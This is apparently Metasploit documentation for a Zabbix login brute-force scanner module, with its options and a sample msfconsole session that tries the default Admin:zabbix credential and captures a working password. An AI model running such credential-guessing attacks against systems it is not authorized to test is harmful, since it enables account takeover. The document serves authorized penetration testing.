## Vulnerable Application

This module attempts to guess valid logins to a specified Zabbix server.
Login details can be retrieved either from an external file, from the database,
or they can be specified one by one via the `USERNAME` and `PASSWORD` options.

This module will also check to see if the default login of `Admin:zabbix` works
and if the target Zabbix host has guest access enabled.

### Environment

Zabbix team provides virtual images of multiple versions of Zabbix
as Zabbix Appliance downloads at https://www.zabbix.com/download_appliance.
This module has been confirmed to work against version 3, 4 and 5, as well as
version 2.4 and 2.2.

## Verification Steps

  1. Download and install one of the Zabbix Appliance virtual images.
  2. Start msfconsole
  3. Do: `use auxiliary/scanner/http/zabbix_login`
  4. Do: `set rhosts [ip]`
  5. Do: `run`
  6. Verify: That the module tries all credentials provided and returns any credentials that it successfully finds.
  7. Verify: That the module also tries the default administrative password of `Admin:zabbix` and also checks if guest access is enabled.
  8. Verify: That running the `creds` command will show that any enumerated passwords have been saved into the database (if one is connected).

## Options

  ### TARGETURI

  Folder where login page is located.  Versions 3 and 4 by default use `/zabbix/`,
  however version 5 uses `/` as its default. Because of this, the module sets
  `TARGETURI` to `/zabbix/` by default, however users can run `set TARGETURI /`
  to change the `TARGETURI` value if needed.

## Scenarios

### Zabbix Version 5.0.5

```
msf6 > use auxiliary/scanner/http/zabbix_login
msf6 auxiliary(scanner/http/zabbix_login) > info

       Name: Zabbix Server Brute Force Utility
     Module: auxiliary/scanner/http/zabbix_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>

Check supported:
  No

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  BLANK_PASSWORDS   false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false            no        Add all users in the current database to the list
  PASSWORD                           no        A specific password to authenticate with
  PASS_FILE                          no        File containing passwords, one per line
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT             80               yes       The target port (TCP)
  SSL               false            no        Negotiate SSL/TLS for outgoing connections
  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
  TARGETURI         /zabbix/         yes       The path to the Zabbix server application
  THREADS           1                yes       The number of concurrent threads (max one per host)
  USERNAME                           no        A specific username to authenticate as
  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS      false            no        Try the username as the password for all users
  USER_FILE                          no        File containing usernames, one per line
  VERBOSE           true             yes       Whether to print output for all attempts
  VHOST                              no        HTTP server virtual host

Description:
  This module attempts to login to Zabbix server instance using
  username and password combinations indicated by the USER_FILE,
  PASS_FILE, and USERPASS_FILE options. It will also test for the
  Zabbix default login (Admin:zabbix) and guest access.

msf6 auxiliary(scanner/http/zabbix_login) > set RHOSTS 172.29.121.85
RHOSTS => 172.29.121.85
msf6 auxiliary(scanner/http/zabbix_login) > set TARGETURI /
TARGETURI => /
msf6 auxiliary(scanner/http/zabbix_login) > set USERNAME Admin
USERNAME => Admin
msf6 auxiliary(scanner/http/zabbix_login) > set PASSWORD zabbix2
PASSWORD => zabbix2
msf6 auxiliary(scanner/http/zabbix_login) > run

[*] 172.29.121.85:80 - Found Zabbix version 5.0
[*] 172.29.121.85:80 - This Zabbix instance has disabled Guest mode
[-] 172.29.121.85:80 - Failed: 'Admin:zabbix'
[+] 172.29.121.85:80 - Success: 'Admin:zabbix2'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/zabbix_login) > creds
Credentials
===========

host           origin         service          public                private                                                            realm  private_type    JtR Format
----           ------         -------          ------                -------                                                            -----  ------------    ----------
172.29.121.85  172.29.121.85  80/tcp (http)    Admin                 zabbix2                                                                   Password

msf6 auxiliary(scanner/http/zabbix_login) >
```
